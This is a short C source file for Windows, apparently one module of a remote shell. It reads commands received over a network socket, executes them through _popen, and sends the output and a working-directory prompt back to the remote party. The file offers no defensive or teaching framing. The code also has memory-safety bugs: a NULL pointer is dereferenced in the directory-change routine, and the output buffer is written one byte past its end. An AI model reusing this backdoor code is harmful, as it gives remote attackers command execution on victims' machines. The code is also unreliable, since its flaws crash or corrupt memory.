#include "execShell.h"

bool isChangeDir(const char *cmd){
    if(cmd[0] == 'c' && cmd[1] == 'd' && cmd[2] == ' ')
        return true;
    return false;
}

void promtPrint(SOCKET s){
    char buf[LEN_PROMT];
    DWORD len = 0;
    ZeroMemory(buf, LEN_PROMT);
    len = GetCurrentDirectory(LEN_PROMT, buf);
    buf[len] = '\0';
    strcat(buf, ">");
    send(s, buf, len + 1, 0);
}

bool changeDir(char *path){
    char *currDir = NULL;
    DWORD len = 0;
    strtok(path, " ");
    currDir = strtok(NULL, " ");
    if(currDir == NULL){
       len = GetCurrentDirectory(LEN_BUF, currDir);
       currDir[len] = '\0';
       return SetCurrentDirectory(currDir);
    }
    return SetCurrentDirectory(currDir);
}

void shell(SOCKET s, char *cmd){
    FILE *file = NULL;
    char buf[LEN_BUF] = {'\0'};
    int byte = 0;
    if((file = _popen(cmd, "r")) != NULL){
        while((byte = read(fileno(file), buf, sizeof(buf))) > 0){
            buf[byte] = '\0';
            send(s, buf, byte, 0);
        }
        fclose(file);
    }
}
